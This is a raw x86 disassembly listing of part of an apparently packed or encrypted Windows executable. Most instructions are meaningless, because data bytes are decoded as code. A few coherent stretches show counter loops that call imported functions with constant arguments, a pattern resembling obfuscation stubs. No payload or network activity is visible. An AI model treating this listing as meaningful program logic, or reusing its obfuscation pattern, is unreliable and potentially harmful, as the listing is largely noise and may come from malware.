  409dd6:	mov    DWORD PTR [edx-0x50],ebx
  409dd9:	sbb    al,0x11
  409ddb:	rcr    dl,1
  409ddd:	ins    DWORD PTR es:[edi],dx
  409dde:	loopne 0x409d6e
  409de0:	test   DWORD PTR [esi],esp
  409de2:	adc    al,BYTE PTR ss:[eax-0x28]
  409de6:	loopne 0x409e2c
  409de8:	push   ecx
  409de9:	mov    edx,0xa8adeaed
  409dee:	test   DWORD PTR [esp+eiz*4+0x24992bd7],esp
  409df5:	or     al,0x5a
  409df7:	inc    edx
  409df8:	push   ebp
  409df9:	out    0xa3,al
  409dfb:	fdivr  st(3),st
  409dfd:	cli    
  409dfe:	jp     0x409dd0
  409e00:	cs pop esi
  409e02:	dec    edx
  409e03:	xor    bh,cl
  409e05:	div    BYTE PTR [ebx+0x5e]
  409e08:	imul   ebx,DWORD PTR [edx],0x6316d41f
  409e0e:	in     eax,dx
  409e0f:	fnstenv [edi-0x466b7834]
  409e15:	js     0x409e3b
  409e17:	outs   dx,DWORD PTR ds:[esi]
  409e18:	push   0x28
  409e1a:	aaa    
  409e1b:	loop   0x409e68
  409e1d:	out    dx,al
  409e1e:	fistp  DWORD PTR [edx+0x2b]
  409e21:	arpl   WORD PTR [ecx+0x1327f8dc],bp
  409e27:	(bad)  
  409e28:	sub    ebx,esi
  409e2a:	idiv   BYTE PTR [edi+0x72]
  409e2d:	pop    esp
  409e2e:	sub    BYTE PTR [ebx+0x71],al
  409e31:	or     al,BYTE PTR [edi]
  409e33:	loopne 0x409e4f
  409e35:	outs   dx,DWORD PTR ds:[esi]
  409e36:	pop    edx
  409e37:	fwait
  409e38:	int    0x6e
  409e3a:	inc    edi
  409e3b:	cmp    edi,DWORD PTR [esi]
  409e3d:	xchg   ebp,eax
  409e3e:	jmp    0x409e39
  409e40:	outs   dx,DWORD PTR ds:[esi]
  409e41:	add    edx,DWORD PTR [edi-0x6e]
  409e44:	(bad)  
  409e45:	cmp    BYTE PTR [eax],dl
  409e47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e48:	ins    DWORD PTR es:[edi],dx
  409e49:	and    BYTE PTR [esi+edi*1-0x14],0x72
  409e4e:	add    esi,DWORD PTR [eax+ecx*8+0x1a3db1d6]
  409e55:	clc    
  409e56:	into   
  409e57:	inc    esp
  409e58:	loope  0x409e0f
  409e5a:	cmc    
  409e5b:	(bad)  [edi+0x2a]
  409e5e:	repnz pop ebp
  409e60:	ret    
  409e61:	sbb    BYTE PTR [esi-0x41aacced],0xcc
  409e68:	sbb    al,BYTE PTR fs:[eax+eax*1-0x2c]
  409e6d:	inc    esi
  409e6e:	lods   eax,DWORD PTR ds:[esi]
  409e6f:	fs pop esp
  409e71:	dec    ebx
  409e72:	fisub  WORD PTR [edx+0x2ae77010]
  409e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e79:	inc    esp
  409e7a:	jne    0x409e1c
  409e7c:	xchg   ebp,eax
  409e7d:	fcomp  QWORD PTR [ebx+0x67898105]
  409e83:	repnz daa 
  409e85:	jg     0x409e97
  409e87:	(bad)
  409e8a:	jne    0x409e14
  409e8c:	jae    0x409ea6
  409e8e:	out    dx,eax
  409e8f:	seto   BYTE PTR [eax-0x483363f5]
  409e96:	int3   
  409e97:	jae    0x409e72
  409e99:	mov    esi,0x459ce94
  409e9e:	mov    WORD PTR [eax-0x7e13e9d2],cs
  409ea4:	je     0xfdd654f9
  409eaa:	hlt    
  409eab:	jl     0x409ea6
  409ead:	sub    eax,0x2369d670
  409eb2:	cmp    BYTE PTR [eax-0x5a],ah
  409eb5:	jl     0x409e74
  409eb7:	jo     0x409e93
  409eb9:	les    ecx,FWORD PTR [edi-0x6e1ea91e]
  409ebf:	js     0x409f3d
  409ec1:	xchg   edx,eax
  409ec2:	jg     0x409e5b
  409ec4:	fdiv   DWORD PTR [ecx+0x75]
  409ec7:	push   0x5
  409ec9:	add    ch,BYTE PTR [ecx+ecx*4+0x5c]
  409ecd:	rcr    DWORD PTR ds:0xd23238e8,0x4e
  409ed4:	sti    
  409ed5:	test   edi,0xd4b7f94f
  409edb:	lods   al,BYTE PTR ds:[esi]
  409edc:	push   0xb858cae4
  409ee1:	dec    edx
  409ee2:	cdq    
  409ee3:	adc    bl,BYTE PTR [eax-0xe]
  409ee6:	enter  0xe2d2,0xd1
  409eea:	jmp    0xaea58a78
  409eef:	popf   
  409ef0:	in     eax,dx
  409ef1:	xlat   BYTE PTR ds:[ebx]
  409ef2:	mov    ebp,0x55ed1c86
  409ef7:	int3   
  409ef8:	(bad)  
  409ef9:	out    dx,eax
  409efa:	(bad)  
  409efb:	inc    dl
  409efd:	jmp    0x409f13
  409eff:	mov    cl,0x7f
  409f01:	iret   
  409f02:	cmp    al,0x58
  409f04:	or     al,0xb4
  409f06:	and    eax,0x33c677a8
  409f0b:	sbb    eax,0x1d65092e
  409f10:	cmc    
  409f11:	fadd   DWORD PTR [ecx-0x4ec23faf]
  409f17:	fadd   QWORD PTR [esi+0x6f]
  409f1a:	cmp    ebp,edx
  409f1c:	icebp  
  409f1d:	cmp    ebx,DWORD PTR [ebp-0x6e3f746a]
  409f23:	retf   
  409f24:	aaa    
  409f25:	outs   dx,DWORD PTR ds:[esi]
  409f26:	mov    ds:0x44ae12a7,al
  409f2b:	lahf   
  409f2c:	or     bl,bl
  409f2e:	les    ebp,FWORD PTR [ebp+0x69]
  409f31:	adc    ch,BYTE PTR [eax]
  409f33:	pop    edi
  409f34:	inc    edx
  409f35:	jnp    0x409ed6
  409f37:	xchg   ebx,eax
  409f38:	dec    esi
  409f39:	shl    eax,1
  409f3b:	cmp    al,0xc5
  409f3d:	cli    
  409f3e:	add    DWORD PTR [edx],eax
  409f40:	xor    al,BYTE PTR [ecx+ecx*2]
  409f43:	(bad)  
  409f44:	aad    0x89
  409f46:	xchg   ecx,eax
  409f47:	shl    dh,1
  409f49:	and    ebx,ecx
  409f4b:	and    BYTE PTR [ebx+0x443dc4a0],al
  409f51:	rcl    BYTE PTR [edx],0xf3
  409f54:	sub    ecx,edx
  409f56:	dec    ebp
  409f57:	xlat   BYTE PTR ds:[ebx]
  409f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f59:	sar    ecx,1
  409f5b:	daa    
  409f5c:	out    dx,al
  409f5d:	loope  0x409ee6
  409f5f:	and    eax,0xd623cb22
  409f64:	fisubr DWORD PTR [ebx]
  409f66:	(bad)
  409f6a:	mov    ebx,0x616e209c
  409f6f:	or     al,0x76
  409f71:	sbb    eax,0xd3c1b86a
  409f76:	push   es
  409f77:	into   
  409f78:	add    al,0x32
  409f7a:	mov    bh,0x14
  409f7c:	xor    DWORD PTR [esi+0xf],eax
  409f7f:	sub    ch,BYTE PTR ds:0x321747a7
  409f85:	jecxz  0x409ff7
  409f87:	les    ebx,FWORD PTR [edi-0x21]
  409f8a:	sbb    ebp,DWORD PTR [edx-0x54d3af0]
  409f90:	shl    DWORD PTR [esi+esi*8],cl
  409f93:	lock retf 
  409f95:	sbb    DWORD PTR [ecx+0x2a],ebp
  409f98:	jb     0x409f9b
  409f9a:	dec    esp
  409f9b:	les    eax,FWORD PTR [edi+0x33]
  409f9e:	out    dx,eax
  409f9f:	data16 xor cl,BYTE PTR [ebp+0x44]
  409fa3:	stos   BYTE PTR es:[edi],al
  409fa4:	adc    eax,0xf48dbc57
  409fa9:	ja     0x409f54
  409fab:	hlt    
  409fac:	xor    ecx,ebx
  409fae:	in     eax,0xd2
  409fb0:	loopne 0x409f52
  409fb2:	paddsb mm1,QWORD PTR [edx+0x17]
  409fb6:	outs   dx,BYTE PTR ds:[esi]
  409fb7:	or     bh,BYTE PTR [eax+0x46]
  409fba:	jge    0x409f90
  409fbc:	add    bl,al
  409fbe:	and    esp,DWORD PTR [edi+0x3aae3186]
  409fc4:	mov    DWORD PTR [ebx-0x22],ebp
  409fc7:	out    0xa,al
  409fc9:	jmp    0xd5eb861d
  409fce:	mov    esp,0x6fad10d
  409fd3:	popf   
  409fd4:	rol    DWORD PTR [edi],1
  409fd6:	rol    DWORD PTR [ebx-0x6b],1
  409fd9:	dec    ebx
  409fda:	xchg   edx,ecx
  409fdc:	jp     0x409faa
  409fde:	pushf  
  409fdf:	mov    esi,0x22d7079e
  409fe4:	mov    ds:0x3e73185f,al
  409fe9:	(bad)  
  409fea:	hlt    
  409feb:	out    dx,al
  409fec:	jo     0x40a063
  409fee:	and    esi,DWORD PTR [ebp+0x3221bce6]
  409ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ff5:	pop    ebx
  409ff7:	add    ebp,esp
  409ff9:	popa   
  409ffa:	inc    eax
  409ffb:	test   eax,0x4eff4b2c
  40a000:	scas   al,BYTE PTR es:[edi]
  40a001:	add    DWORD PTR [esi+0x4962ff38],eax
  40a007:	inc    edi
  40a008:	jmp    0x40a048
  40a00a:	(bad)  
  40a00b:	icebp  
  40a00c:	retf   0xd3d7
  40a00f:	fisttp DWORD PTR [edi]
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	outs   dx,DWORD PTR ds:[esi]
  40a127:	adc    eax,0xe082a50c
  40a12c:	jle    0x40a1ac
  40a12e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a132:	inc    ebp
  40a133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a134:	inc    ecx
  40a135:	cmp    dl,BYTE PTR [eax-0x39]
  40a138:	mov    al,ds:0x81f1f634
  40a13d:	xor    al,ah
  40a13f:	and    DWORD PTR [edx-0x45],esp
  40a142:	test   cl,dh
  40a144:	ds push 0x1d
  40a147:	xchg   ebx,eax
  40a148:	mov    esp,DWORD PTR [eax-0x62]
  40a14b:	frstor [eax]
  40a14d:	xchg   edx,eax
  40a14e:	cmp    edi,DWORD PTR [esi+edi*4]
  40a151:	aas    
  40a152:	jge    0x40a1ca
  40a154:	retf   
  40a155:	hlt    
  40a156:	xor    al,0x3
  40a158:	data16 and BYTE PTR [edi-0x4ece98cd],al
  40a15f:	push   eax
  40a160:	add    bl,dl
  40a162:	mov    cl,dh
  40a164:	dec    edi
  40a165:	in     al,dx
  40a166:	mov    ah,0x6c
  40a168:	xor    eax,0xa7bc4b5e
  40a16d:	rol    DWORD PTR [ebx+esi*8+0x4bddc2d2],cl
  40a174:	ss jb  0x40a143
  40a177:	iret   
  40a178:	jb     0x40a170
  40a17a:	pop    eax
  40a17b:	test   al,0x16
  40a17d:	aad    0xb3
  40a17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a180:	sub    al,0x91
  40a182:	jge    0x40a1b2
  40a184:	mov    cs,WORD PTR [esi+edi*4+0x7b]
  40a188:	les    ebp,FWORD PTR [eax-0x57]
  40a18b:	pop    ds
  40a18c:	and    DWORD PTR [ebx+0x1cc72a0c],0xffffffab
  40a193:	shr    BYTE PTR [esi+0x1d],0xd1
  40a197:	cmp    BYTE PTR [esp+edx*1-0x180dccad],0xe1
  40a19f:	enter  0xa72,0x10
  40a1a3:	arpl   WORD PTR [edi],sp
  40a1a5:	into   
  40a1a6:	jecxz  0x40a1ac
  40a1a8:	push   cs
  40a1a9:	and    cl,0x89
  40a1ac:	sbb    al,BYTE PTR [eax-0xf2c81ac]
  40a1b2:	jmp    0x4438ed6b
  40a1b7:	stc    
  40a1b8:	(bad)  
  40a1b9:	adc    al,0xde
  40a1bb:	scas   eax,DWORD PTR es:[edi]
  40a1bc:	(bad)  
  40a1bd:	mov    bl,0x1e
  40a1bf:	and    ch,cl
  40a1c1:	mov    al,0xec
  40a1c3:	pop    edi
  40a1c4:	ss sub al,0x2e
  40a1c7:	aam    0x49
  40a1c9:	fs xchg edx,eax
  40a1cb:	(bad)  
  40a1cc:	adc    BYTE PTR [ebx+0x24bc4cf6],bl
  40a1d2:	push   ebp
  40a1d3:	mov    ah,0x43
  40a1d5:	loope  0x40a247
  40a1d7:	jge    0x40a194
  40a1d9:	push   ss
  40a1da:	scas   al,BYTE PTR es:[edi]
  40a1db:	mov    eax,0x18e1148e
  40a1e0:	dec    edi
  40a1e1:	xchg   esp,eax
  40a1e2:	scas   eax,DWORD PTR es:[edi]
  40a1e3:	mov    es,ecx
  40a1e5:	fwait
  40a1e6:	outs   dx,DWORD PTR ds:[esi]
  40a1e7:	mov    ebx,DWORD PTR [edx+0x15]
  40a1ea:	adc    ch,0x35
  40a1ed:	je     0x40a21e
  40a1ef:	jbe    0x40a193
  40a1f1:	lods   al,BYTE PTR ds:[esi]
  40a1f2:	mov    dh,0xa8
  40a1f4:	jno    0x40a215
  40a1f6:	sbb    al,0x56
  40a1f8:	cmp    DWORD PTR [esi+0x6a095756],edx
  40a1fe:	pop    edi
  40a1ff:	aaa    
  40a200:	sbb    DWORD PTR [esi-0x3a341518],esp
  40a206:	pop    ss
  40a207:	fsubp  st(3),st
  40a209:	gs stos DWORD PTR es:[edi],eax
  40a20b:	cmp    DWORD PTR [ebp-0x69],edx
  40a20e:	ret    
  40a20f:	mov    ah,0xa8
  40a211:	shl    BYTE PTR [esi+0x1d],0xc9
  40a215:	sar    DWORD PTR [ebx],0xe4
  40a218:	sub    DWORD PTR [ebx+ecx*4],edx
  40a21b:	arpl   WORD PTR [esi-0x658127a3],di
  40a221:	cli    
  40a222:	rol    BYTE PTR [ebx*2+0x1a24ab50],1
  40a229:	mov    cl,0xe4
  40a22b:	int3   
  40a22c:	jmp    0xab04:0x7e9bf133
  40a233:	ins    DWORD PTR es:[edi],dx
  40a234:	pop    es
  40a235:	cmp    BYTE PTR [esi+0x243e7943],dl
  40a23b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a23c:	out    dx,al
  40a23d:	test   al,0x1b
  40a23f:	pop    es
  40a240:	xchg   esi,eax
  40a241:	cmp    DWORD PTR [ecx],edi
  40a243:	xchg   BYTE PTR [eax+ebx*8-0x4350f90b],cl
  40a24a:	(bad)
  40a24f:	retf   
  40a250:	test   al,0x9f
  40a252:	out    dx,al
  40a253:	ins    DWORD PTR es:[edi],dx
  40a254:	cmp    eax,0xbd9490a1
  40a259:	loopne 0x40a240
  40a25b:	fsubp  st(5),st
  40a25d:	pop    ecx
  40a25e:	fisttp QWORD PTR [edi-0x59]
  40a261:	in     eax,dx
  40a262:	les    ebp,FWORD PTR [edi]
  40a264:	push   ebx
  40a265:	xor    eax,esp
  40a267:	scas   eax,DWORD PTR es:[edi]
  40a268:	les    ecx,FWORD PTR [eax]
  40a26a:	mov    esp,0xb53e59e8
  40a26f:	mov    cl,0xf7
  40a271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a273:	dec    DWORD PTR [ebx-0x1682cbc8]
  40a279:	nop
  40a27a:	push   ecx
  40a27b:	out    0xaf,eax
  40a27d:	int    0x33
  40a27f:	retf   
  40a280:	(bad)  
  40a281:	loop   0x40a219
  40a283:	inc    ecx
  40a284:	in     eax,0xd5
  40a286:	aam    0x75
  40a288:	inc    edi
  40a289:	fbld   TBYTE PTR [ebx]
  40a28b:	iret   
  40a28c:	mov    ds:0x41747d41,al
  40a291:	repnz adc cl,0x1a
  40a295:	and    ah,cl
  40a297:	(bad)  
  40a298:	jmp    0x8be6:0xebbac9dc
  40a29f:	ins    DWORD PTR es:[edi],dx
  40a2a0:	pop    ds
  40a2a1:	jmp    0x40a2fd
  40a2a3:	pop    ebx
  40a2a4:	cmp    BYTE PTR [ebp+0x27],dl
  40a2a7:	(bad)  
  40a2a8:	out    dx,al
  40a2a9:	scas   eax,DWORD PTR es:[edi]
  40a2aa:	(bad)  
  40a2ab:	gs xchg esp,eax
  40a2ad:	outs   dx,BYTE PTR ds:[esi]
  40a2ae:	aad    0x3c
  40a2b0:	mov    edx,0x6d884a47
  40a2b5:	aas    
  40a2b6:	pop    edx
  40a2b7:	fadd   QWORD PTR ds:[esi+0x13]
  40a2bb:	cwde   
  40a2bc:	and    BYTE PTR ds:0x6ef40264,bh
  40a2c2:	fnstenv [eax+0x459bd88c]
  40a2c8:	jecxz  0x40a308
  40a2ca:	icebp  
  40a2cb:	sub    DWORD PTR [ebx+0x305e358a],0xffffffb2
  40a2d2:	nop
  40a2d3:	xchg   esp,eax
  40a2d4:	stc    
  40a2d5:	pop    ds
  40a2d6:	pusha  
  40a2d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d8:	xor    eax,0xc3e27f79
  40a2dd:	in     eax,dx
  40a2de:	dec    eax
  40a2df:	fistp  DWORD PTR [edi-0x321d7613]
  40a2e5:	dec    ecx
  40a2e6:	mov    bh,0x16
  40a2e8:	dec    ecx
  40a2e9:	cmp    bl,0x21
  40a2ec:	pop    ds
  40a2ed:	pusha  
  40a2ee:	sub    eax,0x70f4a620
  40a2f3:	jbe    0x40a2dc
  40a2f5:	pop    ebx
  40a2f6:	inc    edi
  40a2f7:	pop    ss
  40a2f8:	(bad)  
  40a2f9:	(bad)  
  40a2fa:	xlat   BYTE PTR ds:[ebx]
  40a2fb:	dec    edx
  40a2fc:	mov    edi,0x21c9f7f2
  40a301:	nop
  40a302:	lods   eax,DWORD PTR ds:[esi]
  40a303:	std    
  40a304:	clc    
  40a305:	add    BYTE PTR [ebx+0x56991e32],bh
  40a30b:	cmp    eax,0x94c22228
  40a310:	into   
  40a311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a312:	cli    
  40a313:	or     al,0xb7
  40a315:	and    al,0x5a
  40a317:	ror    DWORD PTR [ecx+0x52ca7c5f],0xfc
  40a31e:	ds pop ecx
  40a320:	out    0x9e,al
  40a322:	jecxz  0x40a2df
  40a324:	and    al,0x6e
  40a326:	les    ebx,FWORD PTR [ecx-0x28dc84a6]
  40a32c:	jmp    0x40a2cd
  40a32e:	mov    al,0x5c
  40a330:	mov    al,ds:0xe64fc07d
  40a335:	jmp    0xa29424ce
  40a33a:	ret    
  40a33b:	adc    DWORD PTR [ecx-0x25def04a],edx
  40a341:	xchg   ebp,eax
  40a342:	aad    0x6c
  40a344:	sub    ecx,ebp
  40a346:	push   eax
  40a347:	sub    esi,esp
  40a349:	xor    DWORD PTR [edx-0x44],ebp
  40a34c:	mov    WORD PTR [edi],gs
  40a34e:	and    ch,BYTE PTR [ecx+0x21727af8]
  40a354:	shr    edx,1
  40a356:	in     al,0x9
  40a358:	rcr    DWORD PTR ds:0xc7b80e0c,cl
  40a35e:	dec    eax
  40a35f:	sub    al,0x78
  40a361:	outs   dx,BYTE PTR ds:[esi]
  40a362:	xchg   esi,eax
  40a363:	aad    0x41
  40a365:	jmp    0xe2eb:0xafbe15a2
  40a36c:	(bad)  
  40a36d:	retf   
  40a36e:	inc    eax
  40a36f:	test   eax,0x18496138
  40a374:	jbe    0x40a368
  40a376:	fmul   QWORD PTR [ebx+ecx*4+0x4d]
  40a37a:	call   0x25c26bb2
  40a37f:	jnp    0x40a3b8
  40a381:	inc    ebx
  40a382:	add    BYTE PTR [eax],al
  40a384:	add    BYTE PTR [eax],al
  40a386:	add    cl,ch
  40a388:	push   cs
  40a389:	add    BYTE PTR [eax],al
  40a38b:	add    BYTE PTR [ebx],dh
  40a38d:	shl    BYTE PTR [ebx],0x5
  40a390:	jnp    0x40a3c9
  40a392:	inc    ebx
  40a393:	add    BYTE PTR [eax-0x5d],al
  40a396:	jnp    0x40a3cf
  40a398:	inc    ebx
  40a399:	add    BYTE PTR [ebx+0x43377b3d],al
  40a39f:	add    BYTE PTR [esi],dl
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	sti    
  40a49c:	cs clc 
  40a49e:	cmp    cl,BYTE PTR [esi+ebp*8+0x7e]
  40a4a2:	jle    0x40a4dc
  40a4a4:	jl     0x40a524
  40a4a6:	jle    0x40a4b8
  40a4a8:	mov    eax,0x397c1fc2
  40a4ad:	jl     0x40a475
  40a4af:	mov    bh,0x3f
  40a4b1:	call   0xb22c:0x8e768a00
  40a4b8:	sti    
  40a4b9:	pop    ebp
  40a4ba:	pop    esi
  40a4bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4bc:	push   es
  40a4bd:	sub    eax,0x1ae59a1
  40a4c2:	add    ebx,esi
  40a4c4:	xchg   edi,eax
  40a4c5:	cmp    edi,DWORD PTR [ecx]
  40a4c7:	sbb    eax,0x85c14d35
  40a4cc:	bound  eax,QWORD PTR [esi]
  40a4ce:	cmp    dl,BYTE PTR [eax-0x5953776]
  40a4d4:	icebp  
  40a4d5:	out    dx,al
  40a4d6:	cmp    eax,0xc0c4b729
  40a4db:	enter  0x209e,0x13
  40a4df:	add    ah,al
  40a4e1:	mov    ebx,0x85b80164
  40a4e6:	push   ds
  40a4e7:	popf   
  40a4e8:	setns  BYTE PTR [esi]
  40a4eb:	mov    edi,0xd22287b5
  40a4f0:	scas   eax,DWORD PTR es:[edi]
  40a4f1:	push   cs
  40a4f2:	and    edi,DWORD PTR [eax+0x2fc244a7]
  40a4f8:	push   cs
  40a4f9:	mov    BYTE PTR [ecx-0x418e79bd],bl
  40a4ff:	sar    BYTE PTR [ebx],cl
  40a501:	ja     0x40a4e5
  40a503:	push   ebx
  40a504:	push   edx
  40a505:	aad    0x9b
  40a507:	jecxz  0x40a4bb
  40a509:	pop    eax
  40a50a:	(bad)  
  40a50b:	cmp    esp,DWORD PTR [ebp-0x40]
  40a50e:	push   cs
  40a50f:	lock inc ecx
  40a511:	int    0x92
  40a513:	mov    eax,ds:0xe220d471
  40a518:	into   
  40a519:	mov    dl,0x6d
  40a51b:	mov    al,0x91
  40a51d:	rol    BYTE PTR [edx+0x2053574],0x94
  40a524:	ds or  DWORD PTR es:[esi+0xd],esi
  40a529:	push   0x19
  40a52b:	call   0x8de61b52
  40a530:	ror    ch,cl
  40a532:	addr16 sbb cl,bh
  40a535:	(bad)  
  40a536:	gs stos DWORD PTR es:[edi],eax
  40a538:	(bad)  
  40a539:	outs   dx,BYTE PTR ds:[esi]
  40a53a:	inc    esp
  40a53b:	aam    0xfa
  40a53d:	rcl    BYTE PTR [edx],1
  40a53f:	mov    al,ds:0x9197b3f5
  40a544:	xor    ebp,eax
  40a546:	or     BYTE PTR [esi],al
  40a548:	pushf  
  40a549:	js     0x40a4d4
  40a54b:	fisttp QWORD PTR [ebp-0x74]
  40a54e:	inc    ecx
  40a54f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a550:	xor    BYTE PTR [ebx+0x43],0x72
  40a554:	dec    eax
  40a555:	test   al,0xc9
  40a557:	repz inc esi
  40a559:	xchg   BYTE PTR [edi+0x34],al
  40a55c:	aas    
  40a55d:	xor    al,0xf7
  40a55f:	dec    ebx
  40a560:	cmp    ah,ch
  40a562:	and    eax,DWORD PTR [esi]
  40a564:	ret    0xb807
  40a567:	test   BYTE PTR [esi],0x72
  40a56a:	or     DWORD PTR [ebx],0x807f4ad4
  40a570:	xchg   esp,eax
  40a571:	push   ebx
  40a572:	jmp    0x40a54a
  40a574:	mov    edi,0xc174a9a2
  40a579:	sub    DWORD PTR [ebp+ebp*4+0x5ff6a530],0x87a0d10c
  40a584:	stos   DWORD PTR es:[edi],eax
  40a585:	jae    0x40a5e6
  40a587:	in     al,dx
  40a588:	or     ecx,edx
  40a58a:	sbb    DWORD PTR [ecx],0x5a
  40a58d:	cmp    ebx,DWORD PTR [edi+0x16]
  40a590:	test   eax,0x8e8a5781
  40a595:	jns    0x40a5b0
  40a597:	push   esp
  40a598:	arpl   di,ax
  40a59a:	inc    esi
  40a59b:	addr16 xchg edi,eax
  40a59d:	arpl   WORD PTR [edi+0x3ecaa45a],di
  40a5a3:	popa   
  40a5a4:	out    dx,al
  40a5a5:	lods   eax,DWORD PTR ds:[esi]
  40a5a6:	dec    ebp
  40a5a7:	push   ss
  40a5a8:	mov    esp,0x85a17659
  40a5ad:	jge    0x40a55a
  40a5af:	mov    esp,DWORD PTR [ecx+0x7cdcfc3c]
  40a5b5:	add    al,0x81
  40a5b7:	mov    bh,BYTE PTR [eax-0x4c]
  40a5ba:	int    0xcd
  40a5bc:	jns    0x40a541
  40a5be:	test   eax,0x716ad172
  40a5c3:	daa    
  40a5c4:	stos   BYTE PTR es:[edi],al
  40a5c5:	dec    ecx
  40a5c6:	into   
  40a5c7:	dec    edi
  40a5c8:	jbe    0x40a56d
  40a5ca:	dec    esp
  40a5cb:	mov    DWORD PTR gs:[ebx],ebx
  40a5ce:	shr    DWORD PTR [ebx],0x54
  40a5d1:	or     dh,dl
  40a5d3:	scas   al,BYTE PTR es:[edi]
  40a5d4:	icebp  
  40a5d5:	leave  
  40a5d6:	sar    DWORD PTR [ebp-0x4a],cl
  40a5d9:	(bad)  [eax-0x692efc52]
  40a5df:	jne    0x40a628
  40a5e1:	or     BYTE PTR [ebp-0xc],bh
  40a5e4:	pushf  
  40a5e5:	fst    QWORD PTR [ecx-0x778212d0]
  40a5eb:	mov    cl,0xa9
